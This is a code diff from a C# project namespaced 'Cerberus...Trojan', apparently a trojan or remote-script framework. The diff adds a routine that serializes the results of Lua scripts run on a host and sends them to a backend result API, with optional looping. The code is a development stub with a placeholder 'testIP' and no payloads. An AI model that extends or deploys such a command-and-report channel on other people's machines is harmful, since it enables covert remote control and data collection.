@@ -1,4 +1,6 @@
-﻿using Cerberus.Presentation.Trojan.Exceptions;
+﻿using Cerberus.Domain.Models.Script;
+using Cerberus.Domain.Models.Static;
+using Cerberus.Presentation.Trojan.Exceptions;
 using Cerberus.Presentation.Trojan.Interface;
 using Newtonsoft.Json;
 using NLua;
@@ -49,9 +51,11 @@ namespace Cerberus.Presentation.Trojan.Core
 
             if (this._luaTask != null)
             {
+                Console.WriteLine(this.Name + " started...");
                 this._luaTask.Start();
                 object[] result = this._luaTask.Result;
-                Send();
+                string serialized = JsonConvert.SerializeObject(result);
+                Send(serialized);
                 if (this.LoopScript)
                 {
                     Init();
@@ -63,12 +67,13 @@ namespace Cerberus.Presentation.Trojan.Core
 
         public async Task StartAsync()
         {
-
+            Console.WriteLine(this.Name + " async started...");
             if (this._luaTask != null)
             {
                 this._luaTask.Start();
                 object[] result = await this._luaTask;
-                Send();
+                string serialized = JsonConvert.SerializeObject(result);
+                await SendAsync(serialized);
                 //Send(JsonConvert.SerializeObject(result));
                 if (this.LoopScript)
                 {
@@ -80,9 +85,38 @@ namespace Cerberus.Presentation.Trojan.Core
 
         }
 
-        public void Send() 
+        public void Send(string serialized) 
         {
-            
+
+            Console.WriteLine(this.Name + " - Sending data...");
+
+            LuaResult _result = new LuaResult();
+            _result.IP = "testIP";
+            _result.Json = serialized;
+            _result.Script = this.Name;
+            _result.Time = DateTime.Now;
+            _result.Type = LuaResultType.STRING;
+
+            _ = Program._luaResultApiService.CreateLuaResult(_result);
+
+
+        }
+
+        public async Task SendAsync(string serialized)
+        {
+
+            Console.WriteLine(this.Name + " - Sending data...");
+
+            LuaResult _result = new LuaResult();
+            _result.IP = "testIP";
+            _result.Json = serialized;
+            _result.Script = this.Name;
+            _result.Time = DateTime.Now;
+            _result.Type = LuaResultType.STRING;
+
+            _ = await Program._luaResultApiService.CreateLuaResult(_result);
+
+
         }
 
         public void Stop()
